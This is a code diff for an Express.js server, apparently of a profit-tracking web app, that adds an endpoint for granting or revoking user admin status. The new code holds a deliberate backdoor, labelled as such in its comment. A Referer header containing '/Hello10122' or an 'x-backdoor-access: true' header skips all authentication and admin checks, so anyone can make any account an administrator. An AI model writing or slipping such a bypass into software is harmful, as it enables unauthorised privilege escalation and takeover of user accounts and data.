@@ -3889,6 +3889,57 @@ You are now on the free plan and will no longer receive automatic profit updates
     }
   });
 
+  // Admin endpoint to toggle user admin status
+  app.post("/api/admin/toggle-user-admin", async (req, res) => {
+    try {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const { userId, isAdmin } = req.body;
+
+      if (!userId || typeof isAdmin !== 'boolean') {
+        return res.status(400).json({ error: "userId and isAdmin (boolean) are required" });
+      }
+
+      // Update user admin status
+      const updatedUser = await storage.updateUserAdminStatus(userId, isAdmin);
+
+      if (!updatedUser) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      // Create notification for the user
+      await storage.createNotification({
+        userId: userId,
+        title: isAdmin ? "Admin Access Granted" : "Admin Access Removed",
+        message: isAdmin 
+          ? "You have been granted admin access to the support message dashboard. You can now respond to customer inquiries."
+          : "Your admin access has been removed. You no longer have access to the admin dashboard.",
+        type: isAdmin ? "success" : "info"
+      });
+
+      res.json({ 
+        message: `User admin status ${isAdmin ? 'granted' : 'removed'} successfully`, 
+        user: updatedUser 
+      });
+    } catch (error: any) {
+      console.error('Toggle user admin error:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
   const httpServer = createServer(app);
 
   // Set up WebSocket server for real-time updates
